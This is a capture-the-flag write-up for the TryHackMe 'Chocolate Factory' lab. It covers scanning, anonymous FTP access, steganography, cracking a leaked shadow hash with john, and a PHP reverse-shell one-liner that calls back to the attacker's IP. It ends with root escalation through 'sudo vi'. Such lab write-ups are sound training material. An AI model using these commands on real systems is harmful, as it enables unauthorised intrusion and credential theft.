# CTF-Write-up

## Try Hack Me: Chocolate Factory

##### URL: https://tryhackme.com/room/chocolatefactory

##### Created by _https://tryhackme.com/p/0x9747_, _https://tryhackme.com/p/saharshtapi_ and _https://tryhackme.com/p/AndyInfoSec_

![logo](https://user-images.githubusercontent.com/20625004/114892914-db8ec200-9e15-11eb-8fbf-45df6a83d74f.PNG)

You should deploy the machine first.

Add the CTF ip to your host file.

``` echo "CTF ip" >> /etc/hosts```

Run nmap against the target machine.

```nmap -sC -A <target IP>```

We found multiple ports.

Looking carefully of the ``nmap`` output we notice somthing intersting.

![nmap](https://user-images.githubusercontent.com/20625004/114934209-4bb33d00-9e42-11eb-8806-c438fdb96844.PNG)

There is a link.

We access it and download the file.

![key](https://user-images.githubusercontent.com/20625004/114934540-ac427a00-9e42-11eb-84ab-1c14b2952806.PNG)

Seems we found a flag.

Next we found anonymous access on ftp port, lets access it.

Inside there is a gum_room.jpg photo, download it.

``mget gum_room.jpg``

Using ``steghide`` and no password we can extract a txt.

![b64](https://user-images.githubusercontent.com/20625004/114932504-405f1200-9e40-11eb-8452-a04157e52f86.PNG)

There is an indication on the name of the b64.txt which can refer to base64.

Access the file.

![b64_txt](https://user-images.githubusercontent.com/20625004/114932725-7f8d6300-9e40-11eb-8cc2-aab90828b5e7.PNG)

Lets decode it.

You can use a web site for this action or type the following command.

`` echo "the content of the file" | base64 -d``

We found the shadow file of the target system.

![shadow](https://user-images.githubusercontent.com/20625004/114933169-0e9a7b00-9e41-11eb-9123-eb4374131377.PNG)

We found the user with a hashed password we need to decode it.

Lets use ``john`` for this action.

Copy the user we want into a new txt file and use this with ``john``.

``john txt file --w=/path/to/wordlist``

![john](https://user-images.githubusercontent.com/20625004/114933603-82d51e80-9e41-11eb-9bc0-ccb3af9d5014.PNG)

We have a password (flag) we have a user lets access the web portal on port 80.

![portal](https://user-images.githubusercontent.com/20625004/114933813-ca5baa80-9e41-11eb-9f4e-3f31febdc10c.PNG)

Before this step i also used ``gobuster`` in order to find intersting paths on the portal with no success.

![access](https://user-images.githubusercontent.com/20625004/114933995-042cb100-9e42-11eb-993c-67ad6dd6290f.PNG)

Success we have access. 

We can execute commands.

![command](https://user-images.githubusercontent.com/20625004/114934814-14915b80-9e43-11eb-982e-dbfe8b630b17.PNG)

Now lets try reverse shell, set up a netcat listener on a port on your machine and add the below command.

We use PHP since we know that the website is written in PHP.

``php -r '$sock=fsockopen("Your IP",Port);exec("/bin/sh -i <&3 >&3 2>&3");'``

![data](https://user-images.githubusercontent.com/20625004/114935615-14459000-9e44-11eb-92fa-e14f51279d82.PNG)

Within the home directory of the user there is a SSH private key, save it on your system.

Give proper SSH permissions ``chmod 600 xxx`` i named it id_rsa.

Then we use it with the user to access SSH.

``ssh -i id_rsa username@targetIP``

![ssh](https://user-images.githubusercontent.com/20625004/114936474-27a52b00-9e45-11eb-8eed-23d27b19b8cb.PNG)

We now have access and the user flag.

We move on Privilege Escalation.

The first move is to type ``sudo -l``.

![sudo](https://user-images.githubusercontent.com/20625004/114937079-fd07a200-9e45-11eb-9fa8-04f5429d59aa.PNG)

We can execute ``vi`` with root permissions.

Searching on ``https://gtfobins.github.io/gtfobins/vi/`` and we can exploit it.

``sudo vi -c ':!/bin/sh' /dev/null``

![root](https://user-images.githubusercontent.com/20625004/114937496-84551580-9e46-11eb-9f40-427e2945b8b8.PNG)

We are root. Move on the root directory.

There´s a root.py in the folder which contains the follwoing code.

![python](https://user-images.githubusercontent.com/20625004/114937970-2c6ade80-9e47-11eb-9b43-24602fe78492.PNG)

The script will take an input and decrypt it.

After many trials and errors i used the first flag key we found at the first steps.

![flag](https://user-images.githubusercontent.com/20625004/114938288-9a170a80-9e47-11eb-9554-68cca9dcdb96.PNG)

And we have own it. There you should find the last flag.

